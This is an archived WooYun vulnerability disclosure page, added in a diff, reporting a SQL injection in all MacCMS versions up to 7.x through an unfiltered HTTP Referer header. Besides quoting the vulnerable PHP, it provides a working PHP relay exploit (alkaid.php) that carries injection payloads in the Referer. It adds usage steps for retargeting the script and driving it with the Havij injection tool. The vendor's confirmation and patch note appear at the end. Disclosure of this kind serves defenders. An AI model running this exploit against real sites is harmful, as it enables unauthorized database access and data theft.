@@ -1,0 +1,398 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		MacCMS 全版本通杀SQL注射（包括最新7.x）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		MacCMS 全版本通杀SQL注射（包括最新7.x）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/lxj616">lxj616</a> 
+</li><li>提交时间：		2014-01-13 12:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-13：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-16：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-23：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-02：	细节向普通白帽子公开<br/>
+									2014-02-22：	细节向实习白帽子公开<br/>
+									2014-04-13：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">之前我发了个6.x的注射，没人认领，因此这次想找cncert了<br />
+本次针对官网最新7.7版本的maccms测试，和之前的6.x注射有一些差异（重构了代码，而且用了360给的防护脚本）<br />
+结合之前无人认领的旧版注射，可以达到全版本注射<br />
+<br />
+危害不言而喻了吧</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/user/index.php line:615<br />
+<br />
+</p><pre><code>function tg()   //推广功能，吐槽一下之前6.x版本用的英文popularize，这就变拼音了<br />
+{<br />
+	global $db;<br />
+	$userid = be(&quot;get&quot;,&quot;uid&quot;); $userid=chkSql($userid,true); //完全不可控<br />
+	<br />
+	if (!chkGlobalCache(&quot;tjlastdate&quot;)){	setGlobalCache (&quot;tjlastdate&quot;, date(&#039;Y-m-d&#039;),0); }<br />
+	if (isNum($userid)){<br />
+		$ip = getIP();        //我本以为用到了360的过滤脚本<br />
+		$ly=  getReferer();   //我本以为用到了360的过滤脚本，见后面跟踪<br />
+		$row = $db-&gt;getRow(&quot;select * from {pre}user where u_id=&quot; . $userid .&quot;&quot;); <br />
+		if ($row){  //这里不要误会，不是需要你登陆后注射，而是你填一个合法的“推广者”id即可，填1绝对可行，除非整个网站没有会员<br />
+			$sql=&quot;Select * From {pre}user_visit where uv_uid = &quot; .$userid.&quot; and uv_ip =&#039;&quot;.$ip.&quot;&#039; and STR_TO_DATE(uv_time,&#039;%Y-%m-%d&#039;)=&#039;&quot;.date(&quot;Y-m-d&quot;).&quot;&#039;&quot;;   //不在这里exploit，控制referer容易点<br />
+			<br />
+			$row1 = $db-&gt;getRow($sql);<br />
+			if (!$row1){<br />
+				$db-&gt;Add (&quot;{pre}user_visit&quot;,array(&quot;uv_uid&quot;,&quot;uv_ip&quot;,&quot;uv_ly&quot;,&quot;uv_time&quot;), array($userid,$ip,$ly, date(&quot;Y-m-d H:i:s&quot;)));<br />
+//ly变量进入了查询，小心后面还有个date，之后构造的时候不能忘记<br />
+//和以下代码无关<br />
+				$db-&gt;query (&quot;update {pre}user set u_tj=u_tj+1,u_points=u_points+&quot; . app_popularize . &quot; where u_id=&quot;. $userid);<br />
+				if ( strpos( &quot;,&quot;. date(&#039;Y-m-d H:i:s&#039;,time()), getGlobalCache(&quot;tjlastdate&quot;) ) &lt;=0 ) {<br />
+					 $sql=&quot;delete from {pre}user_visit whereSTR_TO_DATE(uv_time,&#039;%Y-%m-%d&#039;)&lt;&#039;&quot;.date(&quot;Y-m-d&quot;).&quot;&#039;&quot;;<br />
+					 $db-&gt;query($sql);<br />
+					 setGlobalCache (&quot;tjlastdate&quot;, date(&#039;Y-m-d&#039;) , 0);<br />
+				}<br />
+			}<br />
+			unset($row1);<br />
+		}<br />
+		unset($row);<br />
+	}<br />
+	redirect (&quot;../&quot;);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+对比，和6.x的差异在于代码重构了，360也给了一个过滤的脚本，但是……<br />
+<br />
+<br />
+<br />
+/inc/function.php   line:248<br />
+<br />
+<br />
+<br />
+</p><pre><code>function getReferer()<br />
+{<br />
+	return $_SERVER[&quot;HTTP_REFERER&quot;];<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+360的过滤脚本哭了，根本就没出场的镜头……<br />
+<br />
+<br />
+<br />
+好吧，原理分析完了，证明危害继续给出poc<br />
+<br />
+<br />
+<br />
+由于在referer里面，又需要构造一下后面的date，于是自己写php中转请求<br />
+<br />
+<br />
+<br />
+原理是转发请求，同时方便地提供$_GET[&quot;a&quot;]用来把注射语句合进referer<br />
+<br />
+<br />
+<br />
+至于date 我直接就构造 now 了，见下文代码<br />
+<br />
+<br />
+<br />
+alkaid.php<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php<br />
+<br />
+function uc_fopen($url, $limit = 0, $post = &#039;&#039;, $cookie = &#039;&#039;, $bysocket = FALSE, $ip = &#039;&#039;, $timeout = 15, $block = TRUE,$inject) {<br />
+<br />
+$return = &#039;&#039;;<br />
+<br />
+$matches = parse_url($url);<br />
+<br />
+!isset($matches[&#039;host&#039;]) &amp;&amp; $matches[&#039;host&#039;] = &#039;&#039;;<br />
+<br />
+!isset($matches[&#039;path&#039;]) &amp;&amp; $matches[&#039;path&#039;] = &#039;&#039;;<br />
+<br />
+!isset($matches[&#039;query&#039;]) &amp;&amp; $matches[&#039;query&#039;] = &#039;&#039;;<br />
+<br />
+!isset($matches[&#039;port&#039;]) &amp;&amp; $matches[&#039;port&#039;] = &#039;&#039;;<br />
+<br />
+$host = $matches[&#039;host&#039;];<br />
+<br />
+$path = $matches[&#039;path&#039;] ? $matches[&#039;path&#039;].($matches[&#039;query&#039;] ? &#039;?&#039;.$matches[&#039;query&#039;] : &#039;&#039;) : &#039;/&#039;;<br />
+<br />
+$port = !empty($matches[&#039;port&#039;]) ? $matches[&#039;port&#039;] : 80;<br />
+<br />
+if($post) {<br />
+<br />
+   $out = &quot;POST $path HTTP/1.0\r\n&quot;;<br />
+<br />
+   $out .= &quot;Accept: **\r\n&quot;;<br />
+<br />
+   //$out .= &quot;Referer: $boardurl\r\n&quot;;<br />
+<br />
+   $out .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+<br />
+   $out .= &quot;User-Agent: $_SERVER[HTTP_USER_AGENT]\r\n&quot;;<br />
+<br />
+   $out .= &quot;Host: $host\r\n&quot;;<br />
+<br />
+   $out .= &quot;Connection: Close\r\n&quot;;<br />
+<br />
+   $out .= &quot;Cookie: $cookie\r\n\r\n&quot;;<br />
+<br />
+}else {<br />
+<br />
+   $out = &quot;GET $path HTTP/1.0\r\n&quot;;<br />
+<br />
+   $out .= &quot;Accept: */*\r\n&quot;;<br />
+<br />
+   $out .= &quot;Referer: a&#039;,(select now()) and &quot;.$inject.&quot;)#\r\n&quot;;<br />
+<br />
+   $out .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+<br />
+   $out .= &quot;User-Agent: $_SERVER[HTTP_USER_AGENT]\r\n&quot;;<br />
+<br />
+   $out .= &quot;Host: $host\r\n&quot;;<br />
+<br />
+   $out .= &quot;Connection: Close\r\n&quot;;<br />
+<br />
+   $out .= &quot;Cookie: $cookie\r\n\r\n&quot;;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+$fp = @fsockopen(($ip ? $ip : $host), $port, $errno, $errstr, $timeout);<br />
+<br />
+if(!$fp) {<br />
+<br />
+   return &#039;&#039;;//note $errstr : $errno \r\n<br />
+<br />
+} else {<br />
+<br />
+   stream_set_blocking($fp, $block);<br />
+<br />
+   stream_set_timeout($fp, $timeout);<br />
+<br />
+   @fwrite($fp, $out);<br />
+<br />
+   $status = stream_get_meta_data($fp);<br />
+<br />
+   if(!$status[&#039;timed_out&#039;]) {<br />
+<br />
+    while (!feof($fp)) {<br />
+<br />
+     if(($header = @fgets($fp)) &amp;&amp; ($header == &quot;\r\n&quot; || $header == &quot;\n&quot;)) {<br />
+<br />
+      break;<br />
+<br />
+     }<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    $stop = false;<br />
+<br />
+    while(!feof($fp) &amp;&amp; !$stop) {<br />
+<br />
+     $data = fread($fp, ($limit == 0 || $limit &gt; 8192 ? 8192 : $limit));<br />
+<br />
+     $return .= $data;<br />
+<br />
+     if($limit) {<br />
+<br />
+      $limit -= strlen($data);<br />
+<br />
+      $stop = $limit &lt;= 0;<br />
+<br />
+     }<br />
+<br />
+    }<br />
+<br />
+   }<br />
+<br />
+   @fclose($fp);<br />
+<br />
+   return $return;<br />
+<br />
+}<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+uc_fopen(&#039;http://127.0.0.1/user/?action=tg&amp;uid=1&#039;,0,0,0,FALSE,&#039;&#039;,15,true,$_GET[&quot;a&quot;]);<br />
+<br />
+echo &#039;hi&#039;;<br />
+<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+用Havij扫描<br />
+<br />
+</p><pre><code>http://127.0.0.1/alkaid.php?a=1%3d1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+就会把构造好的referer发送到http://127.0.0.1/user/?action=tg&amp;uid=1上<br />
+<br />
+<br />
+<br />
+用法：<br />
+<br />
+1.把alkaid.php本地搭建起来<br />
+<br />
+2.修改alkaid.php倒数几行，把http://127.0.0.1/user/?action=tg&amp;uid=1改成对应的测试地址，uid填一个存在的用户即可，自己本身无需登录<br />
+<br />
+3.havij 直射本地alkaid.php http://127.0.0.1/alkaid.php?a=1%3d1<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1111325841365344dfe72680a1ea7dcd28dccd0a.png" target="_blank"><img src="../images/1111325841365344dfe72680a1ea7dcd28dccd0a.png" alt="mac.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1111325841365344dfe72680a1ea7dcd28dccd0a.png" target="_blank"><img src="../images/1111325841365344dfe72680a1ea7dcd28dccd0a.png" alt="mac.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">用360的过滤脚本啊~直接就	return $_SERVER[&quot;HTTP_REFERER&quot;];这让360情何以堪<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lxj616" title="lxj616">lxj616</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048553" title="MacCMS 全版本通杀SQL注射（包括最新7.x）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-01-13 19:15</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">漏洞已经确认，现已更新最新版本程序包，加入了360防护脚本。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48553";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
